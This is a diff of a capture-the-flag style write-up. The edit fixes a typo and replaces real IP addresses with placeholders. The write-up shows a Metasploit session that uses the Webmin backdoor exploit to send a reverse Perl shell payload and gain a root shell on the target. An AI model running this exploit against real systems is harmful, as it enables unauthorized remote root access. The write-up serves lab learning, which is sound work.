@@ -49,7 +49,7 @@ PORT      STATE SERVICE VERSION
 <br>
 
 
-<h2 align="center">$$\textcolor{white}{\textnormal{Used Metasploit framwork}}$$</h2>
+<h2 align="center">$$\textcolor{white}{\textnormal{Used Metasploit framework}}$$</h2>
 
 ```bash
 msf6 > search webmin
@@ -81,22 +81,22 @@ msf6 >  use 10
 ...
 msf6 exploit(linux/http/webmin_backdoor) > show options
 ...
-sf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.10.15.153
-LHOST => 10.10.15.153
-msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.161.107
-RHOSTS => 10.10.161.107
+sf6 exploit(linux/http/webmin_backdoor) > set LHOST AttackIP
+LHOST => AttackIP
+msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS TargetIP
+RHOSTS => TargetIP
 msf6 exploit(linux/http/webmin_backdoor) > set SSL true
 [!] Changing the SSL option's value may require changing RPORT!
 SSL => true
 msf6 exploit(linux/http/webmin_backdoor) > set RPORT 10000
 RPORT => 10000
 msf5 exploit(linux/http/webmin_backdoor) > run
-[*] Started reverse TCP handler on 10.10.15.153:4444 
+[*] Started reverse TCP handler on AttackIP:AttackPort 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target is vulnerable.
 [*] Configuring Automatic (Unix In-Memory) target
 [*] Sending cmd/unix/reverse_perl command payload
-[*] Command shell session 1 opened (10.10.15.153:4444 -> 10.10.161.107:42594) at 2025-04-07 22:54:16 +0100
+[*] Command shell session 1 opened (AttackIP:AttackPort -> TargetIP:TargetPort) at 2025-04-07 ...
 
 id
 uid=0(root) gid=0(root) groups=0(root)
